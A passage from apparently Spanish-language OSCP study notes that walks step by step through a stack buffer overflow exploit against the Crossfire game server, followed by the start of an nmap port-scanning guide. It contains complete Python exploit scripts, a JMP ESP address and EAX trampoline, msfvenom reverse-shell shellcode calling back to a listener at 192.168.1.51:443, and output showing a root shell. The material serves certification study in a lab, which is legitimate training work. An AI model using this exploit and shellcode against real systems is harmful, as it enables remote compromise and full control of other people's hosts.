\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp\"\n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\" \n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre> <p>En el resultado desde edb, observamos la siguiente respuesta:</p> <pre><code>The debugged application encountered a segmentation fault.\nThe address 0x46367046 does not appear to be mapped.\n\nIf you would like to pass this exception to the application press Shift+[F7/F8/F9]\n</code></pre> <p>Teniendo estos valores que han sobreescrito el EIP, calculamos el Offset:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/BoF]\n\u2514\u2500\u2500\u257c #/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046\n[*] Exact match at offset 4368\n</code></pre> <p>Sabiendo ya que su valor es 4368, montamos el siguiente PoC para corroborar que tomamos el control del EIP:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\n# Total bytes: 4379\ncrash = \"A\"*4368 + \"B\"*4 + \"C\"*(4379-4368-4)\n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\" \n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre> <p>Obviamente, hacemos relleno con el caracter C a fin de alcanzar los 4379 bytes. Obtenemos la siguiente respuesta desde edb tras enviar nuestro Buffer:</p> <pre><code>The debugged application encountered a segmentation fault.\nThe address 0x42424242 does not appear to be mapped.\n\nIf you would like to pass this exception to the application press Shift+[F7/F8/F9]\n</code></pre> <p>Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber d\u00f3nde situar nuestro Shellcode.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#register-enumeration","title":"Register Enumeration","text":"<p>En este punto, dado que sabemos que el tama\u00f1o total aceptado antes de que el programa crashee de otra forma es 4379, tenemos en consideraci\u00f3n que de buffer mandamos 4368 y tras sobreescribir el EIP a\u00f1adimos 4 bytes, dejando un total de 7 bytes para generar nuestras instrucciones.</p> <p>Este margen de 7 bytes como podremos intuir dispone de un espacio muy peque\u00f1o para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una t\u00e9cnica). Si atendemos al registro EAX, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:</p> <p><code>EAX: setup sound AAAAAAAAAAAAAAAA...</code></p> <p>Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tama\u00f1o aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondr\u00eda ning\u00fan problema el saltar al registro EAX, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que ser\u00e1n convertidos a Opcodes comenzar\u00e1n a situarse en el registro ESP, lo que hace que primero debamos buscar una direcci\u00f3n en la memoria con permisos de ejecuci\u00f3n para que desde el EIP se aplique un salto al registro ESP y posteriormente de aqu\u00ed saltar al registro EAX.</p> <p>Nos encontraremos con un problema tras saltar al registro EAX, pero lo abordaremos m\u00e1s adelante.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#jmp-esp-opcode","title":"JMP ESP Opcode","text":"<p>Recodemos que contamos con un margen de 7 bytes para definir nuestras instrucciones, donde una de ellas es el salto al registro EAX que pretendemos hacer para posteriormente situar nuestro Shellcode.</p> <p>Lo primero ser\u00e1 hacer que el registro EIP apunte al ESP, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde edb, podemos tras producirse el desbordamiento presionar la tecla Ctrl+O para el Opcode Searcher. </p> <p>Una vez abierto, seleccionamos la direcci\u00f3n del binario crossfire que cuenta con permisos de ejecuci\u00f3n, seleccionando de la lista desplegable el salto ESP -&gt; EIP. Pinchamos en Find y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro ESP.</p> <p>Encontramos la siguiente:</p> <p><code>0x08134596: jmp esp</code></p> <p>Como es de esperar, nuestro registro EIP tomar\u00e1 dicho valor en formato Little Endian:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\n# Total bytes: 4379\ncrash = \"A\"*4368 + pack('&lt;L', 0x08134596) + \"C\"*(4379-4368-4)\n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\" \n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre> <p>Tras enviar el buffer, si establecemos previamente con la tecla F2 un breakpoint en el registro 0x08134596, podremos ver como el aplicativo muestra que el registro EIP apunta a la direcci\u00f3n 0x08134596, correspondiente al ESP. Pulsando la tecla F8, avanzaremos una instrucci\u00f3n por pulsaci\u00f3n, donde se puede ver como las siguientes instrucciones son:</p> <pre><code>bffa:4de0 43           inc ebx\nbffa:4de1 43           inc ebx\nbffa:4de2 43           inc ebx\nbffa:4de3 43           inc ebx\nbffa:4de4 43           inc ebx\nbffa:4de5 43           inc ebx\nbffa:4de6 43           inc ebx\n</code></pre> <p>Correspondiente a los 7 bytes finales de margen que tenemos donde por el momento se encuentran situados nuestro caracter C.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#jmp-eax-from-esp","title":"JMP EAX From ESP","text":"<p>Ahora que controlamos el flujo del programa y estamos en el registro ESP, como este s\u00f3lo cuenta con 7 bytes de margen, saltaremos al registro EAX con el objetivo de depositar posteriormente nuestro Shellcode.</p> <p>Surge un problema a la hora de saltar al registro EAX, y es que la cadena 'setup sound' es interpretada como Opcode:</p> <pre><code>73 65   jae 0xb7487a75\n74 75   je 0xb7487a87\n70 20   jo 0xb7487a34\n73 6f   jae 0xb7487a85\n75 6e   jne 0xb7487a86\n</code></pre> <p>Esto puede causar inconvenientes, pues el flujo del programa como vemos puede tomar saltos a otras direcciones no deseadas haciendo que posteriormente nuestro Shellcode no sea interpretado.</p> <p>La cadena 'setup sound' ocupa 12 bytes (con espacios incluidos), por lo que algo inteligente a hacer desde nasm_shell.rb es aplicar los siguientes Opcodes:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/BoF]\n\u2514\u2500\u2500\u257c #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb \nnasm &gt; add eax,12\n00000000  83C00C            add eax,byte +0xc\nnasm &gt; jmp eax\n00000000  FFE0              jmp eax\n</code></pre> <p>Desplazamos en un margen de 12 bytes el contenido de EAX, de forma que en estos 3 bytes de instrucci\u00f3n el registro se nos quedar\u00eda apuntando justo al comienzo de nuestro b\u00faffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.</p> <p>\u00bfLo bueno de todo esto?, que en total son 5 bytes de instrucci\u00f3n, y si recordamos cont\u00e1bamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.</p> <p>Estos Opcodes al fin y al cabo se traducen en \"\\x83\\xC0\\x0C\\xFF\\xE0\", de forma que nuestro script quedar\u00eda tal y como se representa a continuaci\u00f3n:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\n# Total bytes: 4379\ncrash = \"A\"*4368 + pack('&lt;L', 0x08134596) + \"\\x83\\xC0\\x0C\\xFF\\xE0\" + \"\\x90\\x90\"\n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\" \n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre> <p>Obviamente, a\u00f1adimos 2 bytes de NOPs para completar el tama\u00f1o de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras Aes por nuestro Shellcode, teniendo en consideraci\u00f3n que tras estar codificado por shikata, habr\u00e1 que a\u00f1adir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.</p> <p>\u00a1Que no se nos olvide comprobar los Badchars!, que para este caso son \"\\x00\\x0a\\x0d\\x20\". Este paso no hace falta detallarlo, pues no es el m\u00e1s complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro EAX podemos ir mandando los caracteres a fin de analizar cu\u00e1les de ellos dan problema.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#msfvenom-linux-payload","title":"Msfvenom Linux Payload","text":"<p>Para generar nuestro Shellcode, aplicamos el siguiente comando:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/BoF]\n\u2514\u2500\u2500\u257c #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x20\"\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 95 (iteration=0)\nx86/shikata_ga_nai chosen with final size 95\nPayload size: 95 bytes\nFinal size of c file: 425 bytes\nunsigned char buf[] = \n\"\\xbd\\x85\\xd3\\x0b\\xb7\\xdd\\xc5\\xd9\\x74\\x24\\xf4\\x5e\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x6e\\x12\\x03\\x6e\\x12\\x83\\x6b\\x2f\\xe9\\x42\\x42\\x0b\\x19\"\n\"\\x4f\\xf7\\xe8\\xb5\\xfa\\xf5\\x67\\xd8\\x4b\\x9f\\xba\\x9b\\x3f\\x06\\xf5\"\n\"\\xa3\\xf2\\x38\\xbc\\xa2\\xf5\\x50\\xff\\xfd\\x07\\x93\\x97\\xff\\x07\\xd2\"\n\"\\xdc\\x89\\xe9\\x64\\x44\\xda\\xb8\\xd7\\x3a\\xd9\\xb3\\x36\\xf1\\x5e\\x91\"\n\"\\xd0\\x64\\x70\\x65\\x48\\x11\\xa1\\xa6\\xea\\x88\\x34\\x5b\\xb8\\x19\\xce\"\n\"\\x7d\\x8c\\x95\\x1d\\xfd\";\n</code></pre> <p>Por \u00faltimo, considerando el tama\u00f1o de 95 bytes generados, preparamos nuestro B\u00faffer:</p> <pre><code>#!/usr/bin/python \n\nimport socket, sys\n\nfrom struct import pack\nfrom time import sleep\n\nif len(sys.argv) != 2:\n    print \"\\nUso: python\" + sys.argv[0] + \" &lt;direccionIP&gt;\\n\"\n    sys.exit(0)\n\nhost = sys.argv[1]\nport = 13327\n\n# Shellcode (95 bytes) || msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x20\"\nshellcode = (\"\\xbd\\x85\\xd3\\x0b\\xb7\\xdd\\xc5\\xd9\\x74\\x24\\xf4\\x5e\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x6e\\x12\\x03\\x6e\\x12\\x83\\x6b\\x2f\\xe9\\x42\\x42\\x0b\\x19\"\n\"\\x4f\\xf7\\xe8\\xb5\\xfa\\xf5\\x67\\xd8\\x4b\\x9f\\xba\\x9b\\x3f\\x06\\xf5\"\n\"\\xa3\\xf2\\x38\\xbc\\xa2\\xf5\\x50\\xff\\xfd\\x07\\x93\\x97\\xff\\x07\\xd2\"\n\"\\xdc\\x89\\xe9\\x64\\x44\\xda\\xb8\\xd7\\x3a\\xd9\\xb3\\x36\\xf1\\x5e\\x91\"\n\"\\xd0\\x64\\x70\\x65\\x48\\x11\\xa1\\xa6\\xea\\x88\\x34\\x5b\\xb8\\x19\\xce\"\n\"\\x7d\\x8c\\x95\\x1d\\xfd\")\n\n# Total bytes: 4379\ncrash = \"\\x90\"*16 + shellcode + \"A\"*(4368-95-16) + pack('&lt;L', 0x08134596) + \"\\x83\\xC0\\x0C\\xFF\\xE0\" + \"\\x90\\x90\"\n\n# 95 bytes\nshellcode = (\"\\xbd\\x85\\xd3\\x0b\\xb7\\xdd\\xc5\\xd9\\x74\\x24\\xf4\\x5e\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x6e\\x12\\x03\\x6e\\x12\\x83\\x6b\\x2f\\xe9\\x42\\x42\\x0b\\x19\"\n\"\\x4f\\xf7\\xe8\\xb5\\xfa\\xf5\\x67\\xd8\\x4b\\x9f\\xba\\x9b\\x3f\\x06\\xf5\"\n\"\\xa3\\xf2\\x38\\xbc\\xa2\\xf5\\x50\\xff\\xfd\\x07\\x93\\x97\\xff\\x07\\xd2\"\n\"\\xdc\\x89\\xe9\\x64\\x44\\xda\\xb8\\xd7\\x3a\\xd9\\xb3\\x36\\xf1\\x5e\\x91\"\n\"\\xd0\\x64\\x70\\x65\\x48\\x11\\xa1\\xa6\\xea\\x88\\x34\\x5b\\xb8\\x19\\xce\"\n\"\\x7d\\x8c\\x95\\x1d\\xfd\")\n\nbuffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00#\" \n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n    print \"[*] Enviando buffer...\"\n    sleep(5)\n    s.connect((host,port))\n    s.send(buffer)\n    data=s.recv(1024)\n    print data \n    s.close()\n    print \"[*] Payload Enviado!\" \nexcept:\n    print \"\\nError conectando con el servicio...\\n\"\n    sys.exit(0)\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#ganando-acceso-al-sistema","title":"Ganando Acceso al Sistema","text":"<p>Por \u00faltimo, cerramos edb, corremos el programa normalmente, enviamos el b\u00faffer y previamente estando en escucha desde Netcat por el puerto 443, ganamos acceso al sistema:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #nc -nlvp 443\nNcat: Version 7.70 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 192.168.1.81.\nNcat: Connection from 192.168.1.81:55272.\nscript /dev/null -c bash\nScript started, file is /dev/null\nroot@kali:/root# whoami\nwhoami\nroot\nroot@kali:/root#\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#pentesting","title":"Pentesting","text":"<p>En este punto, se detallan t\u00e9cnicas de Pentesting a abordar sobre las m\u00e1quinas Windows/Linux que se nos presenten.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#general","title":"General","text":"<p>Bajo este apartado se describir\u00e1n t\u00e9cnicas de enumeraci\u00f3n a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#port-scanning","title":"Port Scanning","text":"<p>Cada uno tiene su forma de hacer la enumeraci\u00f3n de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.</p> <ul> <li>Escaneo inicial de puertos abiertos sobre el sistema</li> </ul> <pre><code>nmap -p- --open -T5 -v -oG allPorts ipHost -n\n</code></pre> <ul> <li>Enumeraci\u00f3n del servicio y versionado para los puertos descubiertos sobre el sistema</li> </ul> <pre><code>nmap -p$(cat allPorts | grep -oP '\\d{2,5}/open' | awk '{print $1}' FS=\"/\" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted\n</code></pre> <p>La raz\u00f3n de hacer esto es que me parece mucho m\u00e1s \u00e1gil el poder tener una visual de los puertos abiertos de un primer tir\u00f3n para el escaneo inicial, as\u00ed en lo que posteriormente lanzo el profundo de enumeraci\u00f3n de servicios con los scripts b\u00e1sicos de enumeraci\u00f3n, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).</p> <ul> <li>En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante</li> </ul> <pre><code>nmap -A -T4 -v ipHost -oN misc\n</code></pre> <p>Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de b\u00fasqueda a fin de determinar los puertos que est\u00e1n abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haci\u00e9ndolo incompleto):</p> <pre><code>nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000\nnmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000\nnmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000\n                        .\n                        .\n                        .\n</code></pre> <p>En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script http-enum.nse de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario peque\u00f1o pero nos puede servir para tener una visual r\u00e1pida sobre los recursos alojados):</p> <pre><code>nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan\n</code></pre> <ul> <li>Visualizaci\u00f3n de categor\u00edas para los scripts de nmap</li> </ul> <pre><code>grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '\".*?\"' | sort -u\n</code></pre> <p>Estas categor\u00edas son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categor\u00edas:</p> <pre><code>nmap -p21,445 --script=\"vuln and safe\" ipHost -oN vulnSafeScan\n</code></pre> <p>En cuanto a los Low Hanging Fruit, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos m\u00e1s, pero corresponden a servicios que nos pueden garantizar la ejecuci\u00f3n de comandos en remoto sobre los sistemas):</p> <pre><code>nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN 